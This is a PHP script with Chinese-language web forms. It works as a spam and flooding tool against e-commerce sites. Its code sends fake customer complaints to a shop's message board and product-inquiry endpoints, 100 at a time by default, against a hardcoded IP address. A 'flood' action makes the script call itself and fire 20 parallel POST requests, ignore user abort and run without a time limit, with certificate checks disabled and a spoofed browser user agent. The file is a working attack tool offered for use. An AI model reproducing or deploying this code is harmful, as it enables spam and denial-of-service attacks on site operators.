<?php    

class EpiCurl
{
  const timeout = 3;
  static $inst = null;
  static $singleton = 0;
  private $mc;
  private $msgs;
  private $running;
  private $execStatus;
  private $selectStatus;
  private $sleepIncrement = 1.1;
  private $requests = array();
  private $responses = array();
  private $properties = array();

  function __construct()
  {
    if(self::$singleton == 0)
    {
      throw new Exception('This class cannot be instantiated by the new keyword.  You must instantiate it using: $obj = EpiCurl::getInstance();');
    }

    $this->mc = curl_multi_init();
    $this->properties = array(
      'code'  => CURLINFO_HTTP_CODE,
      'time'  => CURLINFO_TOTAL_TIME,
      'length'=> CURLINFO_CONTENT_LENGTH_DOWNLOAD,
      'type'  => CURLINFO_CONTENT_TYPE,
      'url'   => CURLINFO_EFFECTIVE_URL
      );
  }

  public function addCurl($ch)
  {
    $key = (string)$ch;
    $this->requests[$key] = $ch;

    $code = curl_multi_add_handle($this->mc, $ch);
    
    // (1)
    if($code === CURLM_OK || $code === CURLM_CALL_MULTI_PERFORM)
    {
      do {
          $code = $this->execStatus = curl_multi_exec($this->mc, $this->running);
      } while ($this->execStatus === CURLM_CALL_MULTI_PERFORM);

      return new EpiCurlManager($key);
    }
    else
    {
      return $code;
    }
  }

  public function getResult($key = null)
  {
    if($key != null)
    {
      if(isset($this->responses[$key]))
      {
        return $this->responses[$key];
      }

      $innerSleepInt = $outerSleepInt = 1;
      while($this->running && ($this->execStatus == CURLM_OK || $this->execStatus == CURLM_CALL_MULTI_PERFORM))
      {
        usleep($outerSleepInt);
        $outerSleepInt *= $this->sleepIncrement;
        $ms=curl_multi_select($this->mc, 0);
        if($ms > 0)
        {
          do{
            $this->execStatus = curl_multi_exec($this->mc, $this->running);
            usleep($innerSleepInt);
            $innerSleepInt *= $this->sleepIncrement;
            usleep($innerSleepInt);
          }while($this->execStatus==CURLM_CALL_MULTI_PERFORM);
          $innerSleepInt = 0;
        }
          $this->storeResponses();
          if(isset($this->responses[$key]))
          {
            return $this->responses[$key];
          }
          $runningCurrent = $this->running;
      }
      return null;
    }
    return false;
  }

  private function storeResponses()
  {
    while($done = curl_multi_info_read($this->mc))
    {
      $key = (string)$done['handle'];
      $this->responses[$key]['data'] = curl_multi_getcontent($done['handle']);
      foreach($this->properties as $name => $const)
      {
        $this->responses[$key][$name] = curl_getinfo($done['handle'], $const);
        curl_multi_remove_handle($this->mc, $done['handle']);
        curl_close($done['handle']);
      }
    }
  }

  static function getInstance()
  {
    if(self::$inst == null)
    {
      self::$singleton = 1;
      self::$inst = new EpiCurl();
    }

    return self::$inst;
  }
}

class EpiCurlManager
{
  private $key;
  private $epiCurl;

  function __construct($key)
  {
    $this->key = $key;
    $this->epiCurl = EpiCurl::getInstance();
  }

  function __get($name)
  {
    $responses = $this->epiCurl->getResult($this->key);
    return $responses[$name];
  }

  function __isset($name)
  {
    $val = self::__get($name);
    return empty($val);
  }
}

/*
$mc = EpiCurl::getInstance();

$ch1 = curl_init('http://www.yahoo.com');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
$curl1 = $mc->addCurl($ch1);

// connect to a database
// loop over some records
// authenticate a user

$ch2 = curl_init('http://www.google.com');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
$curl2 = $mc->addCurl($ch2);

// open a file
// loop over the lines in the file
// close the file

$ch3 = curl_init('http://www.slooooooooooooooooow.com');
curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
$curl3 = $mc->addCurl($ch3);

echo "Response code from Yahoo! is {$curl1->code}\n";
echo "Response code from Google is {$curl2->code}\n";
*/

class browser{

    var $cookie_file;
    var $user_agent;
    
    function __construct(){
        $this->cookie_file = dirname(__FILE__)."/cookie_".md5(basename(__FILE__)).".txt"; 
        $this->user_agent = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; )";
    }
    
    function __destruct(){
        if(file_exists($this->cookie_file))
        unlink($this->cookie_file);
    }
       
    function login($url,$data){ 
        $curl = curl_init(); 
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1); 
        curl_setopt($curl, CURLOPT_USERAGENT, $this->user_agent); 
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($curl, CURLOPT_AUTOREFERER, 1); 
        curl_setopt($curl, CURLOPT_POST, 1); 
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data); 
        curl_setopt($curl, CURLOPT_COOKIEJAR, $this->cookie_file); 
        curl_setopt($curl, CURLOPT_COOKIEFILE, $this->cookie_file); 
        curl_setopt($curl, CURLOPT_TIMEOUT, 30); 
        curl_setopt($curl, CURLOPT_HEADER, 0); 
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
        $tmpInfo = curl_exec($curl); 
        if (curl_errno($curl)) {    
           echo 'Errno'.curl_error($curl);    
        }    
        curl_close($curl); 
        return $tmpInfo; 
    }    
       
    function get($url){ 
        $curl = curl_init(); 
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1); 
        curl_setopt($curl, CURLOPT_USERAGENT, $this->user_agent); 
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($curl, CURLOPT_AUTOREFERER, 1); 
        curl_setopt($curl, CURLOPT_HTTPGET, 1); 
        curl_setopt($curl, CURLOPT_COOKIEFILE, $this->cookie_file); 
        curl_setopt($curl, CURLOPT_TIMEOUT, 30); 
        curl_setopt($curl, CURLOPT_HEADER, 0); 
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $tmpInfo = curl_exec($curl); 
        if (curl_errno($curl)) {    
           echo 'Errno'.curl_error($curl);    
        }    
        curl_close($curl); 
        return $tmpInfo;
    }    
       
    function post($url,$data){ 
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1); 
        curl_setopt($curl, CURLOPT_USERAGENT, $this->user_agent); 
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
        curl_setopt($curl, CURLOPT_POST, 1); 
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data); 
        curl_setopt($curl, CURLOPT_COOKIEFILE, $this->cookie_file); 
        curl_setopt($curl, CURLOPT_TIMEOUT, 30); 
        curl_setopt($curl, CURLOPT_HEADER, 0); 
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
        $tmpInfo = curl_exec($curl); 
        if (curl_errno($curl)) {    
            echo 'Errno'.curl_error($curl);    
        }    
        curl_close($curl); 
        return $tmpInfo; 
    }    
    
    function is_login(){
        return file_exists($this->cookie_file);
    }
    
    function m_post($url,$data,$m=10){
        // 创建cURL批处理句柄
        $mh = curl_multi_init();
        for($i=0;$i<$m;$i++){
                $i = curl_init();
                $this->set_post_ch($i,$url,$data);
                curl_multi_add_handle($mh,$i);
                $case[] = $i;
        }         
        // 预定义一个状态变量
        $active = null;        
        // 执行批处理
        do {
            $mrc = curl_multi_exec($mh, $active);
        } while ($mrc == CURLM_CALL_MULTI_PERFORM);
        
        while ($active && $mrc == CURLM_OK) {
            if (curl_multi_select($mh) != -1) {
                do {
                    $mrc = curl_multi_exec($mh, $active);
                } while ($mrc == CURLM_CALL_MULTI_PERFORM);
                
            }
        }
        foreach($case as $item){
        	curl_multi_remove_handle($mh, $item);
    	}
		curl_multi_close($mh);
    }
    
    function set_post_ch(&$curl,$url,$data){
        curl_setopt($curl, CURLOPT_URL, $url); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1); 
        curl_setopt($curl, CURLOPT_USERAGENT, $this->user_agent); 
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
        curl_setopt($curl, CURLOPT_POST, 1); 
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data); 
        curl_setopt($curl, CURLOPT_COOKIEFILE, $this->cookie_file); 
        curl_setopt($curl, CURLOPT_TIMEOUT, 30); 
        curl_setopt($curl, CURLOPT_HEADER, 0); 
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
    }
    
    function nonblock_post($url,$data){
		$curl = curl_init();
      	curl_setopt($curl, CURLOPT_URL, $url); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1); 
        curl_setopt($curl, CURLOPT_USERAGENT, $this->user_agent); 
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
        curl_setopt($curl, CURLOPT_POST, 1); 
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data); 
        curl_setopt($curl, CURLOPT_COOKIEFILE, $this->cookie_file); 
        curl_setopt($curl, CURLOPT_TIMEOUT, 30); 
        curl_setopt($curl, CURLOPT_HEADER, 0); 
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
	
		$mc = EpiCurl::getInstance();
		$curl1 = $mc->addCurl($curl);	

    }
       
}

$thread = 20;

if($_POST){
    switch($_POST['action']){
        case "bbs":           
            $post_url = rtrim($_POST['e_site'],'/')."/?message-sendMsgToOpt.html";
            $post_data = "subject=".urlencode($_POST[e_subject])."&message=".urlencode($_POST[e_content])."&email={$_POST[e_name]}";
            $num = intval($_POST['e_num']);
            $num = $num ? $num : 100;
            
        break;
        
        case "p_ask":
        	if(!preg_match('/(http:\/\/.*)\/.*([0-9]+).html/',$_POST['e_p_url'],$ret)){
        		exit;
        	}
			$domain = $ret[1];
			$p_id = $ret[2];
        	$post_url = $domain."/?comment-".$p_id."-ask-toComment.html";
            $post_data = "title=".urlencode($_POST[e_title])."&contact=".$_POST[e_contact]."&comment=".urlencode($_POST[e_comment]);
            $num = intval($_POST['e_num']);
            $num = $num ? $num : 100;
        break;
        
        case "flood":
        	ignore_user_abort();
        	set_time_limit(0);
        	$post_url = $_POST['post_url'];
        	$post_data = $_POST['post_data'];
        	$b = new browser;
        	$b->m_post($post_url,$post_data,$thread);
        	unset($b);
        	echo "send ok";
    		exit;
        break;
    }
    
    $host = isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:$_SERVER['HTTP_HOST'];
   	$host = rtrim($host,'/');
   	$uri = $_SERVER['PHP_SELF'];
   	$uri = ltrim($uri,'/');
   	$url = "http://$host/$uri";
	$data = "action=flood&post_url=$post_url&post_data=$post_data";
	$b = new browser;
    $step = ceil($num / $thread);
    for($i=0;$i<$step;$i++){
    	$b->nonblock_post($url,$data);
        echo "……ok……";
        usleep(500);
        ob_flush();
   		flush();
    }
    echo "<script>alert('all done');</script>";
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml">
<head> 
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
</head>

<form method=post>
<div style="width:50%">
<fieldset>
<legend>留言板</legend>
<table>
<tr><td>用户名：</td><td><input type='text' name='e_name' size=32 value='noname@nowhere.com'></td></tr>
<tr><td>主题：</td><td><input type='text' name='e_subject' size=32 value='我前天买的衣服有点问题'></td></tr>
<tr><td >留言:</td><td><textarea name='e_content' cols=50 rows=5 >是这样的，衣服的颜色太淡了，我觉得问题很严重，请尽快解决，我的电话是13800138000！</textarea></td></tr>
<tr><td>发送条数:</td><td><input type='text' name='e_num' value=100></td></tr>
<tr><td>网站地址:</td><td><input type='text' name='e_site' value=http://61.152.76.187/></td></tr>
<input type='hidden' name='action' value='bbs'>
</table>
</fieldset>
</div>
<input type='submit' value='start'>

</form>



<form method=post>
<div style="width:50%">
<fieldset>
<legend>商品咨询</legend>
<table>
<tr><td>用户名：</td><td><input type='text' name='e_contact' size=32 value='noname@nowhere.com'></td></tr>
<tr><td>主题：</td><td><input type='text' name='e_title' size=32 value='这个商品挺奇怪'></td></tr>
<tr><td >留言:</td><td><textarea name='e_comment' cols=50 rows=5 >是这样的，衣服的颜色太淡了，我觉得问题很严重，请尽快解决，我的电话是13800138000！</textarea></td></tr>
<tr><td>发送条数:</td><td><input type='text' name='e_num' value=100></td></tr>
<tr><td>网站地址:</td><td><input type='text' name='e_p_url' size=32 value=http://61.152.76.187/?product-37.html></td></tr>
<input type='hidden' name='action' value='p_ask'>
</table>
</fieldset>
</div>
<input type='submit' value='start'>

</form>


<form method=post>
<div style="width:50%">
<fieldset>
<legend>商品评论</legend>
<table>
<tr><td>用户名：</td><td><input type='text' name='e_contact' size=32 value='noname@nowhere.com'></td></tr>
<tr><td>主题：</td><td><input type='text' name='e_title' size=32 value='这个商品挺奇怪'></td></tr>
<tr><td >留言:</td><td><textarea name='e_comment' cols=50 rows=5 >是这样的，衣服的颜色太淡了，我觉得问题很严重，请尽快解决，我的电话是13800138000！</textarea></td></tr>
<tr><td>发送条数:</td><td><input type='text' name='e_num' value=100></td></tr>
<tr><td>网站地址:</td><td><input type='text' name='e_p_url' size=32 value=http://61.152.76.187/?product-37.html></td></tr>
<input type='hidden' name='action' value='p_order'>
</table>
</fieldset>
</div>
<input type='submit' value='start'>

</form>


